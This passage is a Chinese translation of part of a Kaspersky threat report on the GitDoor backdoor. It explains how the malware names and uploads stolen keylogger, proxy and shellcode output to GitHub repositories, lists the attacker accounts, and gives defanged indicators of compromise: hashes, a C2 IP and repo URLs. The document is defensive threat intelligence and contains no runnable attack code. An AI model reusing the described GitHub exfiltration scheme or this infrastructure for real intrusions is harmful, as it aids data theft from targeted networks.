用于 XOR 加密的文件名同时决定了数据在 GitHub 仓库中的落点。文件名遵循这一方案：main.%victim_unique_code%.%random_4_char%.js.%ext%，其中 %victim_unique_code% 是恶意软件创建 GitHub issue 时返回的标识符，%ext% 指明文件中存储的载荷类型，可为以下之一：kmap 表示键盘记录输出，pmap 表示代理输出，apmap 表示 Ably 代理输出，tmp 表示文件管理器命令输出，而「无扩展名」表示 shellcode 输出，即文件名以.js 结尾且不带额外扩展名。示例如下。

| GitHub 路径 | 输出类型 |
| --- | --- |
| /repos/LatonyCharnleyaW/Trix/contents/main.wdlwkho0.q94e.js.kmap | 键盘记录命令输出 |
| /repos/LatonyCharnleyaW/Trix/contents/main.13g2vvwp.t17e.js.pmap | 代理命令输出 |
| /repos/LatonyCharnleyaW/Trix/contents/main.w5y2t1qs.1s6b.js.apmap | Ably 代理命令输出 |
| /repos/LatonyCharnleyaW/Trix/contents/main.wqktoqxf.ymlj.js.tmp | 文件管理器命令输出 |
| /repos/LatonyCharnleyaW/Trix/contents/main.z3dU7Y5B.sCe7.js | Shellcode 输出 |

05

REPOSITORIES

### GitHub 仓库

正如本报告所详述的，GitDoor 后门利用 GitHub 仓库上传与下载数据——对 C2 操作者而言，这是一项再简单不过的任务。我们发现以下仓库被用于各类后门样本：

https://github\[.\]com/LatonyCharnleyaW

上传

Trix

下载

Havo（仓库已被下线）

创建

（仓库已被下线）

https://github\[.\]com/StevenDFournier

上传

spaceJS

下载

NA

创建

2024 年 9 月 3 日

邮箱

steve\*\*\*\*\*\*\*\*\*\*@outlook.com

https://github\[.\]com/JeneLeo

上传

silverPot

下载

laughbot

创建

2025 年 3 月 21 日

邮箱

Jenevie\*\*\*\*\*\*\*\*\*\*@yahoo.com

https://github\[.\]com/VenoraKlanimU

上传

logdata

下载

appdb

创建

2025 年 10 月 20 日

邮箱

Venora\*\*\*\*\*\*\*@yahoo.com

https://github\[.\]com/AlexandaJazzmynwC

上传

PulseHub

下载

QuantumVault

创建

2025 年 11 月 19 日

邮箱

Alexanda\*\*\*\*\*\*\*\*\*@yahoo.com

https://github\[.\]com/FloraineSuvitC

上传

NexaCore

下载

DataFlowX

创建

2025 年 11 月 19 日

邮箱

Floraine\*\*\*\*\*\*@yahoo.com

https://github\[.\]com/bvgarciajocelynxccZ

上传

DataSphere

下载

CodeForge

创建

2025 年 12 月 4 日

邮箱

bvgarcia\*\*\*\*\*\*\*\*\*\*@yahoo.com

https://github\[.\]com/Eclemensadolph1n

上传

DataCore

下载

alpha

创建

2025 年 12 月 4 日

邮箱

Eclemen\*\*\*\*\*\*\*\*@yahoo.com

https://github\[.\]com/aYulysseserinYtas

上传

Solix

下载

Zephyr

创建

2025 年 12 月 5 日

邮箱

aYulysses\*\*\*\*\*\*\*\*@yahoo.com

这些 GitHub 仓库的创建日期大多表明，威胁行为者早在 2024 年底就已在筹备此次行动的基础设施。

06

CONCLUSION

### 结论

在本篇（第一部分）中，我们回顾了此次活动中观察到的初始感染向量与各类加载器，并给出了 **GitDoor 后门** 的技术细节、其命令与控制通信协议，以及它可以投递的众多 shellcode 模块。

在故事的下一部分，我们将深入分析 **GraphDoor 后门**、它用于键盘记录、进程列表与屏幕截取的插件、修改版 Erfrp 代理与 Ably 信道代理，以及已恢复的 C2 地址。我们还会给出技术归因说明，把这次行动与中文语种威胁行为者联系起来。

「云服务不再是信道之外的中转站，它本身就成了信道。防守方需要把 SaaS API 的异常调用，当作一等公民的检测对象。」

07

INDICATORS OF COMPROMISE

### 失陷指标

MeshAgent

MD5

74b025084026d8d9a64661bf995d835b

1 型加载器

MD5

32151547d912488ac5242731057170a3

e9d4081fac4a5111e6856f333d490439

2 型加载器

MD5

e63ec733393e4e7e3424cbff918003a3

加密载荷

MD5

3896d44bc6d517291c60ee3f70543a31

b930fb3ab14fe45b378d5acfa6e0a763

6a54f8008ee659b6923abf5dba2b2cc1

GitDoor

MD5

552f0a9cc5fc3755721fa49be05e8035

GraphDoor

MD5

14ec33ea808e697870d00c5e434c2952

合法可执行文件

| MD5 | 文件名 |
| --- | --- |
| 8b78ef5609d942036e93721d75bd1f29 | javaw.exe |
| be739a7036dc8e2ee8608fba13c8c3a4 | start.exe |
| 84802caf2579cfe7a38f079a64a3cd22 | pythonw.exe |
| d955d03104f988582cbd2967177693d3 | zoomit.exe |

MeshAgent C2

IP

27\[.\]102\[.\]66\[.\]162

合法云存储

DOMAIN

upload.gofile\[.\]io

GitHub 仓库

URL

hxxps://github\[.\]com/LatonyCharnleyaW

hxxps://github\[.\]com/StevenDFournier

hxxps://github\[.\]com/VenoraKlanimU

hxxps://github\[.\]com/JeneLeo

hxxps://github\[.\]com/AlexandaJazzmynwC

hxxps://github\[.\]com/FloraineSuvitC

hxxps://github\[.\]com/bvgarciajocelynxccZ

hxxps://github\[.\]com/Eclemensadolph1n

hxxps://github\[.\]com/aYulysseserinYtas

标签：Malware Technologies / Malware Descriptions / Malware / Backdoor / DLL sideloading / shellcode / GitHub / Operation ShadowCloud / MeshAgent / GitDoor

原文信息

标题：Operation ShadowCloud: cloud service–based backdoors targeting government networks in Asia and Africa. Part 1

作者：Saurabh Sharma、Noushin Shabab

发布：Kaspersky Securelist，2026 年 11 月 17 日

来源：https://securelist.com/operation-shadowcloud-gitdoor/122004/

本文为原文的中文译述，仅用于网络安全研究、威胁情报交流与防御建设参考。文中出现的恶意代码技术细节、工具名称与基础设施指标，其目的仅为帮助防守方识别与阻断此类攻击，任何人不得将其用于未授权的入侵、测试或攻击行为。译文力求忠实原文，技术判断与结论均属原作者及 Kaspersky 观点，不代表译者立场；因翻译可能存在的细微偏差，请以原文为准。文中图片版权归 Kaspersky 所有，此处引用仅作说明之用。

END

如果你觉得这篇有收获，欢迎 **点赞、在看、转发** 三连，我们下篇见。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a7509ae51812024c.webp)

更多 卡巴斯基 安全解决方案 详情，请联系：

高进 - 186 6376 1060
![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/61239f7ae74c55dc.jpg)
